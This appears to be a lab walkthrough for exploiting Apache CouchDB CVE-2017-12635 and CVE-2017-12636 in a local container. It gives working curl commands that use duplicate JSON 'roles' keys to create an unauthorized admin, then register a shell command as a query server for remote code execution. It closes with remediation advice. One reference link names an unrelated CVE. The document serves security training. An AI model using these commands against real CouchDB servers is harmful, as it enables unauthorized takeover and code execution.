# Apache CouchDB JSON Parser Differential Admin Escalation & RCE (CVE-2017-12635 / CVE-2017-12636)

## Overview

Apache CouchDB vulnerabilities CVE-2017-12635 and CVE-2017-12636 represent a critical chained attack against CouchDB NoSQL database clusters (versions prior to 1.7.0 and 2.1.1).

The attack chain consists of two stages:
1. **CVE-2017-12635 (JSON Parser Differential)**: CouchDB uses two different JSON parsers: an Erlang-based JSON parser (`jiffy`) and SpiderMonkey (JavaScript engine). In the user registration API (`/_users`), an attacker can submit duplicate keys in a single JSON document (e.g. two `roles` fields). One parser takes the first key while the other takes the last key, bypassing the non-admin role check and allowing anyone to grant themselves the `_admin` role.
2. **CVE-2017-12636 (Erlang Query Server RCE)**: Once authenticated as an administrator, CouchDB permits configuring query servers via the HTTP API (`/_config/query_servers`). By defining an arbitrary system command as an Erlang query server, the attacker achieves instant Remote Code Execution.

- **Primary Interface**: TCP Port `5984` (`http://localhost:5984`)
- **Docker Shortcut**: `./lab start couchdb-privesc`
- **Container Name**: `cyberlab_02_couchdb_erlang_rce`
- **RAM Footprint**: ~150 MB (Erlang VM + CouchDB 2.1.0)

---

## Exploitation Walkthrough

### 1. Privilege Escalation: Creating an Unauthorized Admin (CVE-2017-12635)
Submit a user registration request with duplicate `roles` fields:

```bash
curl -X PUT 'http://localhost:5984/_users/org.couchdb.user:attacker' \
  -H "Content-Type: application/json" \
  -d '{
    "type": "user",
    "name": "attacker",
    "roles": ["_admin"],
    "roles": [],
    "password": "Password123!"
  }'
```

Response: `{"ok":true,"id":"org.couchdb.user:attacker", ...}`. The user `attacker` is now a cluster administrator.

### 2. Remote Code Execution via Query Server (CVE-2017-12636)
Authenticate as `attacker:Password123!` and register an arbitrary shell command as a query server:

```bash
# Register shell command as a query server
curl -X PUT 'http://attacker:Password123!@localhost:5984/_node/nonode@nohost/_config/query_servers/cmd' \
  -H "Content-Type: application/json" \
  -d '"id > /tmp/pwned"'

# Create a temporary database and trigger execution
curl -X PUT 'http://attacker:Password123!@localhost:5984/pwn_db'
curl -X PUT 'http://attacker:Password123!@localhost:5984/pwn_db/doc1' -d '{"data":"test"}'
curl -X POST 'http://attacker:Password123!@localhost:5984/pwn_db/_temp_view' \
  -H "Content-Type: application/json" \
  -d '{"language":"cmd","map":""}'
```

Verify command execution inside the container:
```bash
docker exec -it cyberlab_02_couchdb_erlang_rce cat /tmp/pwned
```

---

## Defensive Remediation & Hardening

1. **Upgrade CouchDB**:
   Upgrade to CouchDB 2.1.1, 1.7.0, or newer. CouchDB enforces strict validation rejecting JSON bodies with duplicate keys and disables arbitrary query server registration over HTTP.
2. **Restrict Configuration Endpoints**:
   Never expose CouchDB administrative APIs or node-level configuration endpoints to untrusted clients.

---

## Video Walkthroughs & Technical References

- [Apache CouchDB Unauthorized RCE Vulnerability (CVE-2022-24706)](https://www.youtube.com/watch?v=9FrsVPzqfUE)
- [Apache CouchDB Security Releases](https://blog.couchdb.org/2017/11/14/apache-couchdb-cve-2017-12635-and-cve-2017-12636/)
- [Vulhub CouchDB CVE-2017-12636 Advisory](https://vulhub.org/#/environments/couchdb/CVE-2017-12636/)
